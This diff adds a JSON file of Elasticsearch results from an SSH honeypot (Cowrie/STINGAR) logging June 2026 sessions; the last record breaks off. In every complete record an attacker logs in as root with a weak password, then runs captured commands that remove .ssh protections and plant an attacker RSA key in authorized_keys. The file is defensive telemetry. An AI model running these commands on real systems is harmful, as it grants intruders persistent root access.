@@ -1,0 +1,1201 @@
+{
+  "took": 12,
+  "timed_out": false,
+  "_shards": {
+    "total": 2,
+    "successful": 2,
+    "skipped": 0,
+    "failed": 0
+  },
+  "hits": {
+    "total": {
+      "value": 9540,
+      "relation": "eq"
+    },
+    "max_score": 1,
+    "hits": [
+      {
+        "_index": "stingar-2026-06-01",
+        "_id": "W5CagJ4BVhuTze9gC3w4",
+        "_score": 1,
+        "_ignored": [
+          "hp_data.commands.keyword",
+          "hp_data.kex.hassh_algorithms.keyword",
+          "hp_data.ttylog.keyword"
+        ],
+        "_source": {
+          "app": "cowrie",
+          "sensor": {
+            "uuid": "287bcd0281eb46a2817893cd514f3336",
+            "hostname": "vm1223.cloud.azure.com",
+            "tags": {
+              "misc": [
+                ""
+              ]
+            },
+            "asn": ""
+          },
+          "protocol": "ssh",
+          "start_time": "2026-06-01T00:33:51.386858Z",
+          "end_time": "2026-06-01T00:33:58.684737Z",
+          "src_ip": "103.187.165.26",
+          "src_port": 39846,
+          "dst_ip": "74.235.47.28",
+          "dst_port": 2222,
+          "hp_data": {
+            "con_type": "accept",
+            "transport": "tcp",
+            "session": "caeb0a3b135a",
+            "credentials": [
+              {
+                "username": "root",
+                "password": "younes123",
+                "success": true
+              }
+            ],
+            "commands": [
+              "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+              """cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"""
+            ],
+            "unknown_commands": [
+              "lockr -ia .ssh"
+            ],
+            "urls": [],
+            "files": [],
+            "uploads": [],
+            "version": "SSH-2.0-libssh_0.12.0",
+            "ttylog": "0100000000000000000000000000000021901c6a0fe206000300000000000000e50100000300000021901c6a9ae206006364207e20262620726d202d7266202e737368202626206d6b646972202e737368202626206563686f20227373682d727361204141414142334e7a6143317963324541414141424a514141415145417244703463756e326c6872344b5568424745375676416377646c6932613864626e72544f72624d7a312b354f37336663424f78384e56625554306255616e555639744a322f3970372b76443045705a33547a2f2b306b5833347541783152562f373547564f6d4e782b394575574f6e764e6f614a65305158787a69496739654c424870674c4d75616b62352b42675446422b724b4a417739753946535444656e677653386858316b4e4653344d6a757830684a4f4b38727663456d5065636a647953594d6236366e796c414b477743454536574551486d64316d55506748774751306857437773516b3133794347504b357736685970357a596b466e766c433868476d643457772b7539376b36706654475455624a6b3134756a7663443969554b5154545759596a49497535506d5575783562735a305234574677644965362b693672424c4173504b67417953564b50524b2b6f52773d3d206d647266636b72223e3e2e7373682f617574686f72697a65645f6b6579732026262063686d6f64202d5220676f3d207e2f2e737368202626206364207e0200000000000000000000000000000021901c6a7ddf0c00",
+            "arch": "linux-x64-lsb",
+            "client_height": null,
+            "client_width": null,
+            "key_fingerprint": null,
+            "kex": {
+              "hassh": "af8223ac9914f509afdadfaf5f7ee94e",
+              "hassh_algorithms": "mlkem768x25519-sha256,mlkem768nistp256-sha256,sntrup761x25519-sha512,sntrup761x25519-sha512@openssh.com,curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,ext-info-c,kex-strict-c-v00@openssh.com;chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512;none,zlib@openssh.com",
+              "kex_algorithms": [
+                "mlkem768x25519-sha256",
+                "mlkem768nistp256-sha256",
+                "sntrup761x25519-sha512",
+                "sntrup761x25519-sha512@openssh.com",
+                "curve25519-sha256",
+                "curve25519-sha256@libssh.org",
+                "ecdh-sha2-nistp256",
+                "ecdh-sha2-nistp384",
+                "ecdh-sha2-nistp521",
+                "diffie-hellman-group18-sha512",
+                "diffie-hellman-group16-sha512",
+                "diffie-hellman-group-exchange-sha256",
+                "diffie-hellman-group14-sha256",
+                "ext-info-c",
+                "kex-strict-c-v00@openssh.com"
+              ],
+              "key_algorithms": [
+                "ssh-ed25519",
+                "ecdsa-sha2-nistp521",
+                "ecdsa-sha2-nistp384",
+                "ecdsa-sha2-nistp256",
+                "sk-ssh-ed25519@openssh.com",
+                "sk-ecdsa-sha2-nistp256@openssh.com",
+                "rsa-sha2-512",
+                "rsa-sha2-256"
+              ],
+              "enc_cs": [
+                "chacha20-poly1305@openssh.com",
+                "aes256-gcm@openssh.com",
+                "aes128-gcm@openssh.com",
+                "aes256-ctr",
+                "aes192-ctr",
+                "aes128-ctr"
+              ],
+              "mac_cs": [
+                "hmac-sha2-256-etm@openssh.com",
+                "hmac-sha2-512-etm@openssh.com",
+                "hmac-sha2-256",
+                "hmac-sha2-512"
+              ],
+              "comp_cs": [
+                "none",
+                "zlib@openssh.com"
+              ],
+              "lang_cs": [
+                ""
+              ]
+            },
+            "geo_city": null,
+            "geo_cc": null,
+            "geopoint": null,
+            "geo_asn": 149897,
+            "geo_asn_org": "PT Amanusa Telemedia Mahardika"
+          },
+          "@timestamp": "2026-06-01T00:33:58.000000000+00:00",
+          "fluentd_tag": "stingar.events.cowrie"
+        }
+      },
+      {
+        "_index": "stingar-2026-06-01",
+        "_id": "MpCDgJ4BVhuTze9gDnxl",
+        "_score": 1,
+        "_ignored": [
+          "hp_data.commands.keyword",
+          "hp_data.kex.hassh_algorithms.keyword",
+          "hp_data.ttylog.keyword"
+        ],
+        "_source": {
+          "app": "cowrie",
+          "sensor": {
+            "uuid": "287bcd0281eb46a2817893cd514f3336",
+            "hostname": "vm1223.cloud.azure.com",
+            "tags": {
+              "misc": [
+                ""
+              ]
+            },
+            "asn": ""
+          },
+          "protocol": "ssh",
+          "start_time": "2026-06-01T00:08:43.516895Z",
+          "end_time": "2026-06-01T00:08:50.839322Z",
+          "src_ip": "180.93.43.225",
+          "src_port": 57194,
+          "dst_ip": "74.235.47.28",
+          "dst_port": 2222,
+          "hp_data": {
+            "con_type": "accept",
+            "transport": "tcp",
+            "session": "249edc3e1aae",
+            "credentials": [
+              {
+                "username": "root",
+                "password": "starwars",
+                "success": true
+              }
+            ],
+            "commands": [
+              "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+              """cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"""
+            ],
+            "unknown_commands": [
+              "lockr -ia .ssh"
+            ],
+            "urls": [],
+            "files": [],
+            "uploads": [],
+            "version": "SSH-2.0-libssh_0.9.6",
+            "ttylog": "0100000000000000000000000000000021901c6a0fe206000300000000000000e50100000300000021901c6a9ae206006364207e20262620726d202d7266202e737368202626206d6b646972202e737368202626206563686f20227373682d727361204141414142334e7a6143317963324541414141424a514141415145417244703463756e326c6872344b5568424745375676416377646c6932613864626e72544f72624d7a312b354f37336663424f78384e56625554306255616e555639744a322f3970372b76443045705a33547a2f2b306b5833347541783152562f373547564f6d4e782b394575574f6e764e6f614a65305158787a69496739654c424870674c4d75616b62352b42675446422b724b4a417739753946535444656e677653386858316b4e4653344d6a757830684a4f4b38727663456d5065636a647953594d6236366e796c414b477743454536574551486d64316d55506748774751306857437773516b3133794347504b357736685970357a596b466e766c433868476d643457772b7539376b36706654475455624a6b3134756a7663443969554b5154545759596a49497535506d5575783562735a305234574677644965362b693672424c4173504b67417953564b50524b2b6f52773d3d206d647266636b72223e3e2e7373682f617574686f72697a65645f6b6579732026262063686d6f64202d5220676f3d207e2f2e737368202626206364207e0200000000000000000000000000000021901c6a7ddf0c00",
+            "arch": "linux-x64-lsb",
+            "client_height": null,
+            "client_width": null,
+            "key_fingerprint": null,
+            "kex": {
+              "hassh": "f555226df1963d1d3c09daf865abdc9a",
+              "hassh_algorithms": "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",
+              "kex_algorithms": [
+                "curve25519-sha256",
+                "curve25519-sha256@libssh.org",
+                "ecdh-sha2-nistp256",
+                "ecdh-sha2-nistp384",
+                "ecdh-sha2-nistp521",
+                "diffie-hellman-group18-sha512",
+                "diffie-hellman-group16-sha512",
+                "diffie-hellman-group-exchange-sha256",
+                "diffie-hellman-group14-sha256",
+                "diffie-hellman-group14-sha1",
+                "diffie-hellman-group1-sha1",
+                "ext-info-c"
+              ],
+              "key_algorithms": [
+                "ssh-ed25519",
+                "ecdsa-sha2-nistp521",
+                "ecdsa-sha2-nistp384",
+                "ecdsa-sha2-nistp256",
+                "rsa-sha2-512",
+                "rsa-sha2-256",
+                "ssh-rsa",
+                "ssh-dss"
+              ],
+              "enc_cs": [
+                "aes256-gcm@openssh.com",
+                "aes128-gcm@openssh.com",
+                "aes256-ctr",
+                "aes192-ctr",
+                "aes128-ctr",
+                "aes256-cbc",
+                "aes192-cbc",
+                "aes128-cbc",
+                "3des-cbc"
+              ],
+              "mac_cs": [
+                "hmac-sha2-256-etm@openssh.com",
+                "hmac-sha2-512-etm@openssh.com",
+                "hmac-sha1-etm@openssh.com",
+                "hmac-sha2-256",
+                "hmac-sha2-512",
+                "hmac-sha1"
+              ],
+              "comp_cs": [
+                "none"
+              ],
+              "lang_cs": [
+                ""
+              ]
+            },
+            "geo_city": null,
+            "geo_cc": "VN",
+            "geopoint": {
+              "lat": 10.8142,
+              "lon": 106.6438
+            },
+            "geo_asn": 7602,
+            "geo_asn_org": "Sai gon Postel Corporation"
+          },
+          "@timestamp": "2026-06-01T00:08:50.000000000+00:00",
+          "fluentd_tag": "stingar.events.cowrie"
+        }
+      },
+      {
+        "_index": "stingar-2026-06-01",
+        "_id": "NZCDgJ4BVhuTze9gUHzh",
+        "_score": 1,
+        "_ignored": [
+          "hp_data.commands.keyword",
+          "hp_data.kex.hassh_algorithms.keyword",
+          "hp_data.ttylog.keyword"
+        ],
+        "_source": {
+          "app": "cowrie",
+          "sensor": {
+            "uuid": "287bcd0281eb46a2817893cd514f3336",
+            "hostname": "vm1223.cloud.azure.com",
+            "tags": {
+              "misc": [
+                ""
+              ]
+            },
+            "asn": ""
+          },
+          "protocol": "ssh",
+          "start_time": "2026-06-01T00:09:02.123966Z",
+          "end_time": "2026-06-01T00:09:08.173813Z",
+          "src_ip": "221.162.214.111",
+          "src_port": 2955,
+          "dst_ip": "74.235.47.28",
+          "dst_port": 2222,
+          "hp_data": {
+            "con_type": "accept",
+            "transport": "tcp",
+            "session": "ca249ab4ce06",
+            "credentials": [
+              {
+                "username": "root",
+                "password": "1020304050",
+                "success": true
+              }
+            ],
+            "commands": [
+              "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+              """cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"""
+            ],
+            "unknown_commands": [
+              "lockr -ia .ssh"
+            ],
+            "urls": [],
+            "files": [],
+            "uploads": [],
+            "version": "SSH-2.0-libssh_0.9.6",
+            "ttylog": "0100000000000000000000000000000021901c6a0fe206000300000000000000e50100000300000021901c6a9ae206006364207e20262620726d202d7266202e737368202626206d6b646972202e737368202626206563686f20227373682d727361204141414142334e7a6143317963324541414141424a514141415145417244703463756e326c6872344b5568424745375676416377646c6932613864626e72544f72624d7a312b354f37336663424f78384e56625554306255616e555639744a322f3970372b76443045705a33547a2f2b306b5833347541783152562f373547564f6d4e782b394575574f6e764e6f614a65305158787a69496739654c424870674c4d75616b62352b42675446422b724b4a417739753946535444656e677653386858316b4e4653344d6a757830684a4f4b38727663456d5065636a647953594d6236366e796c414b477743454536574551486d64316d55506748774751306857437773516b3133794347504b357736685970357a596b466e766c433868476d643457772b7539376b36706654475455624a6b3134756a7663443969554b5154545759596a49497535506d5575783562735a305234574677644965362b693672424c4173504b67417953564b50524b2b6f52773d3d206d647266636b72223e3e2e7373682f617574686f72697a65645f6b6579732026262063686d6f64202d5220676f3d207e2f2e737368202626206364207e0200000000000000000000000000000021901c6a7ddf0c00",
+            "arch": "linux-x64-lsb",
+            "client_height": null,
+            "client_width": null,
+            "key_fingerprint": null,
+            "kex": {
+              "hassh": "f555226df1963d1d3c09daf865abdc9a",
+              "hassh_algorithms": "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",
+              "kex_algorithms": [
+                "curve25519-sha256",
+                "curve25519-sha256@libssh.org",
+                "ecdh-sha2-nistp256",
+                "ecdh-sha2-nistp384",
+                "ecdh-sha2-nistp521",
+                "diffie-hellman-group18-sha512",
+                "diffie-hellman-group16-sha512",
+                "diffie-hellman-group-exchange-sha256",
+                "diffie-hellman-group14-sha256",
+                "diffie-hellman-group14-sha1",
+                "diffie-hellman-group1-sha1",
+                "ext-info-c"
+              ],
+              "key_algorithms": [
+                "ssh-ed25519",
+                "ecdsa-sha2-nistp521",
+                "ecdsa-sha2-nistp384",
+                "ecdsa-sha2-nistp256",
+                "rsa-sha2-512",
+                "rsa-sha2-256",
+                "ssh-rsa",
+                "ssh-dss"
+              ],
+              "enc_cs": [
+                "aes256-gcm@openssh.com",
+                "aes128-gcm@openssh.com",
+                "aes256-ctr",
+                "aes192-ctr",
+                "aes128-ctr",
+                "aes256-cbc",
+                "aes192-cbc",
+                "aes128-cbc",
+                "3des-cbc"
+              ],
+              "mac_cs": [
+                "hmac-sha2-256-etm@openssh.com",
+                "hmac-sha2-512-etm@openssh.com",
+                "hmac-sha1-etm@openssh.com",
+                "hmac-sha2-256",
+                "hmac-sha2-512",
+                "hmac-sha1"
+              ],
+              "comp_cs": [
+                "none"
+              ],
+              "lang_cs": [
+                ""
+              ]
+            },
+            "geo_city": null,
+            "geo_cc": "KR",
+            "geopoint": {
+              "lat": 37.5112,
+              "lon": 126.97409999999999
+            },
+            "geo_asn": 4766,
+            "geo_asn_org": "Korea Telecom"
+          },
+          "@timestamp": "2026-06-01T00:09:08.000000000+00:00",
+          "fluentd_tag": "stingar.events.cowrie"
+        }
+      },
+      {
+        "_index": "stingar-2026-06-01",
+        "_id": "OJCDgJ4BVhuTze9gk3xU",
+        "_score": 1,
+        "_ignored": [
+          "hp_data.commands.keyword",
+          "hp_data.kex.hassh_algorithms.keyword",
+          "hp_data.ttylog.keyword"
+        ],
+        "_source": {
+          "app": "cowrie",
+          "sensor": {
+            "uuid": "287bcd0281eb46a2817893cd514f3336",
+            "hostname": "vm1223.cloud.azure.com",
+            "tags": {
+              "misc": [
+                ""
+              ]
+            },
+            "asn": ""
+          },
+          "protocol": "ssh",
+          "start_time": "2026-06-01T00:09:19.986226Z",
+          "end_time": "2026-06-01T00:09:26.574545Z",
+          "src_ip": "211.20.14.156",
+          "src_port": 55105,
+          "dst_ip": "74.235.47.28",
+          "dst_port": 2222,
+          "hp_data": {
+            "con_type": "accept",
+            "transport": "tcp",
+            "session": "092b4153c9de",
+            "credentials": [
+              {
+                "username": "root",
+                "password": "1212",
+                "success": true
+              }
+            ],
+            "commands": [
+              "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+              """cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"""
+            ],
+            "unknown_commands": [
+              "lockr -ia .ssh"
+            ],
+            "urls": [],
+            "files": [],
+            "uploads": [],
+            "version": "SSH-2.0-libssh_0.9.6",
+            "ttylog": "0100000000000000000000000000000021901c6a0fe206000300000000000000e50100000300000021901c6a9ae206006364207e20262620726d202d7266202e737368202626206d6b646972202e737368202626206563686f20227373682d727361204141414142334e7a6143317963324541414141424a514141415145417244703463756e326c6872344b5568424745375676416377646c6932613864626e72544f72624d7a312b354f37336663424f78384e56625554306255616e555639744a322f3970372b76443045705a33547a2f2b306b5833347541783152562f373547564f6d4e782b394575574f6e764e6f614a65305158787a69496739654c424870674c4d75616b62352b42675446422b724b4a417739753946535444656e677653386858316b4e4653344d6a757830684a4f4b38727663456d5065636a647953594d6236366e796c414b477743454536574551486d64316d55506748774751306857437773516b3133794347504b357736685970357a596b466e766c433868476d643457772b7539376b36706654475455624a6b3134756a7663443969554b5154545759596a49497535506d5575783562735a305234574677644965362b693672424c4173504b67417953564b50524b2b6f52773d3d206d647266636b72223e3e2e7373682f617574686f72697a65645f6b6579732026262063686d6f64202d5220676f3d207e2f2e737368202626206364207e0200000000000000000000000000000021901c6a7ddf0c00",
+            "arch": "linux-x64-lsb",
+            "client_height": null,
+            "client_width": null,
+            "key_fingerprint": null,
+            "kex": {
+              "hassh": "f555226df1963d1d3c09daf865abdc9a",
+              "hassh_algorithms": "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",
+              "kex_algorithms": [
+                "curve25519-sha256",
+                "curve25519-sha256@libssh.org",
+                "ecdh-sha2-nistp256",
+                "ecdh-sha2-nistp384",
+                "ecdh-sha2-nistp521",
+                "diffie-hellman-group18-sha512",
+                "diffie-hellman-group16-sha512",
+                "diffie-hellman-group-exchange-sha256",
+                "diffie-hellman-group14-sha256",
+                "diffie-hellman-group14-sha1",
+                "diffie-hellman-group1-sha1",
+                "ext-info-c"
+              ],
+              "key_algorithms": [
+                "ssh-ed25519",
+                "ecdsa-sha2-nistp521",
+                "ecdsa-sha2-nistp384",
+                "ecdsa-sha2-nistp256",
+                "rsa-sha2-512",
+                "rsa-sha2-256",
+                "ssh-rsa",
+                "ssh-dss"
+              ],
+              "enc_cs": [
+                "aes256-gcm@openssh.com",
+                "aes128-gcm@openssh.com",
+                "aes256-ctr",
+                "aes192-ctr",
+                "aes128-ctr",
+                "aes256-cbc",
+                "aes192-cbc",
+                "aes128-cbc",
+                "3des-cbc"
+              ],
+              "mac_cs": [
+                "hmac-sha2-256-etm@openssh.com",
+                "hmac-sha2-512-etm@openssh.com",
+                "hmac-sha1-etm@openssh.com",
+                "hmac-sha2-256",
+                "hmac-sha2-512",
+                "hmac-sha1"
+              ],
+              "comp_cs": [
+                "none"
+              ],
+              "lang_cs": [
+                ""
+              ]
+            },
+            "geo_city": null,
+            "geo_cc": "TW",
+            "geopoint": {
+              "lat": 23.5,
+              "lon": 121
+            },
+            "geo_asn": 3462,
+            "geo_asn_org": "Data Communication Business Group"
+          },
+          "@timestamp": "2026-06-01T00:09:26.000000000+00:00",
+          "fluentd_tag": "stingar.events.cowrie"
+        }
+      },
+      {
+        "_index": "stingar-2026-06-01",
+        "_id": "U5CXgJ4BVhuTze9ghnxe",
+        "_score": 1,
+        "_ignored": [
+          "hp_data.commands.keyword",
+          "hp_data.kex.hassh_algorithms.keyword",
+          "hp_data.ttylog.keyword"
+        ],
+        "_source": {
+          "app": "cowrie",
+          "sensor": {
+            "uuid": "287bcd0281eb46a2817893cd514f3336",
+            "hostname": "vm1223.cloud.azure.com",
+            "tags": {
+              "misc": [
+                ""
+              ]
+            },
+            "asn": ""
+          },
+          "protocol": "ssh",
+          "start_time": "2026-06-01T00:31:05.564453Z",
+          "end_time": "2026-06-01T00:31:12.881592Z",
+          "src_ip": "103.187.165.26",
+          "src_port": 45916,
+          "dst_ip": "74.235.47.28",
+          "dst_port": 2222,
+          "hp_data": {
+            "con_type": "accept",
+            "transport": "tcp",
+            "session": "42c8fa74e12e",
+            "credentials": [
+              {
+                "username": "root",
+                "password": "123412",
+                "success": true
+              }
+            ],
+            "commands": [
+              "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+              """cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"""
+            ],
+            "unknown_commands": [
+              "lockr -ia .ssh"
+            ],
+            "urls": [],
+            "files": [],
+            "uploads": [],
+            "version": "SSH-2.0-libssh_0.12.0",
+            "ttylog": "0100000000000000000000000000000021901c6a0fe206000300000000000000e50100000300000021901c6a9ae206006364207e20262620726d202d7266202e737368202626206d6b646972202e737368202626206563686f20227373682d727361204141414142334e7a6143317963324541414141424a514141415145417244703463756e326c6872344b5568424745375676416377646c6932613864626e72544f72624d7a312b354f37336663424f78384e56625554306255616e555639744a322f3970372b76443045705a33547a2f2b306b5833347541783152562f373547564f6d4e782b394575574f6e764e6f614a65305158787a69496739654c424870674c4d75616b62352b42675446422b724b4a417739753946535444656e677653386858316b4e4653344d6a757830684a4f4b38727663456d5065636a647953594d6236366e796c414b477743454536574551486d64316d55506748774751306857437773516b3133794347504b357736685970357a596b466e766c433868476d643457772b7539376b36706654475455624a6b3134756a7663443969554b5154545759596a49497535506d5575783562735a305234574677644965362b693672424c4173504b67417953564b50524b2b6f52773d3d206d647266636b72223e3e2e7373682f617574686f72697a65645f6b6579732026262063686d6f64202d5220676f3d207e2f2e737368202626206364207e0200000000000000000000000000000021901c6a7ddf0c00",
+            "arch": "linux-x64-lsb",
+            "client_height": null,
+            "client_width": null,
+            "key_fingerprint": null,
+            "kex": {
+              "hassh": "af8223ac9914f509afdadfaf5f7ee94e",
+              "hassh_algorithms": "mlkem768x25519-sha256,mlkem768nistp256-sha256,sntrup761x25519-sha512,sntrup761x25519-sha512@openssh.com,curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,ext-info-c,kex-strict-c-v00@openssh.com;chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512;none,zlib@openssh.com",
+              "kex_algorithms": [
+                "mlkem768x25519-sha256",
+                "mlkem768nistp256-sha256",
+                "sntrup761x25519-sha512",
+                "sntrup761x25519-sha512@openssh.com",
+                "curve25519-sha256",
+                "curve25519-sha256@libssh.org",
+                "ecdh-sha2-nistp256",
+                "ecdh-sha2-nistp384",
+                "ecdh-sha2-nistp521",
+                "diffie-hellman-group18-sha512",
+                "diffie-hellman-group16-sha512",
+                "diffie-hellman-group-exchange-sha256",
+                "diffie-hellman-group14-sha256",
+                "ext-info-c",
+                "kex-strict-c-v00@openssh.com"
+              ],
+              "key_algorithms": [
+                "ssh-ed25519",
+                "ecdsa-sha2-nistp521",
+                "ecdsa-sha2-nistp384",
+                "ecdsa-sha2-nistp256",
+                "sk-ssh-ed25519@openssh.com",
+                "sk-ecdsa-sha2-nistp256@openssh.com",
+                "rsa-sha2-512",
+                "rsa-sha2-256"
+              ],
+              "enc_cs": [
+                "chacha20-poly1305@openssh.com",
+                "aes256-gcm@openssh.com",
+                "aes128-gcm@openssh.com",
+                "aes256-ctr",
+                "aes192-ctr",
+                "aes128-ctr"
+              ],
+              "mac_cs": [
+                "hmac-sha2-256-etm@openssh.com",
+                "hmac-sha2-512-etm@openssh.com",
+                "hmac-sha2-256",
+                "hmac-sha2-512"
+              ],
+              "comp_cs": [
+                "none",
+                "zlib@openssh.com"
+              ],
+              "lang_cs": [
+                ""
+              ]
+            },
+            "geo_city": null,
+            "geo_cc": null,
+            "geopoint": null,
+            "geo_asn": 149897,
+            "geo_asn_org": "PT Amanusa Telemedia Mahardika"
+          },
+          "@timestamp": "2026-06-01T00:31:12.000000000+00:00",
+          "fluentd_tag": "stingar.events.cowrie"
+        }
+      },
+      {
+        "_index": "stingar-2026-06-01",
+        "_id": "VpCYgJ4BVhuTze9gYXw5",
+        "_score": 1,
+        "_ignored": [
+          "hp_data.commands.keyword",
+          "hp_data.kex.hassh_algorithms.keyword",
+          "hp_data.ttylog.keyword"
+        ],
+        "_source": {
+          "app": "cowrie",
+          "sensor": {
+            "uuid": "287bcd0281eb46a2817893cd514f3336",
+            "hostname": "vm1223.cloud.azure.com",
+            "tags": {
+              "misc": [
+                ""
+              ]
+            },
+            "asn": ""
+          },
+          "protocol": "ssh",
+          "start_time": "2026-06-01T00:32:01.828543Z",
+          "end_time": "2026-06-01T00:32:09.076755Z",
+          "src_ip": "103.187.165.26",
+          "src_port": 46410,
+          "dst_ip": "74.235.47.28",
+          "dst_port": 2222,
+          "hp_data": {
+            "con_type": "accept",
+            "transport": "tcp",
+            "session": "ccbb408dbf90",
+            "credentials": [
+              {
+                "username": "root",
+                "password": "sangoma",
+                "success": true
+              }
+            ],
+            "commands": [
+              "cd ~; chattr -ia .ssh; lockr -ia .ssh",
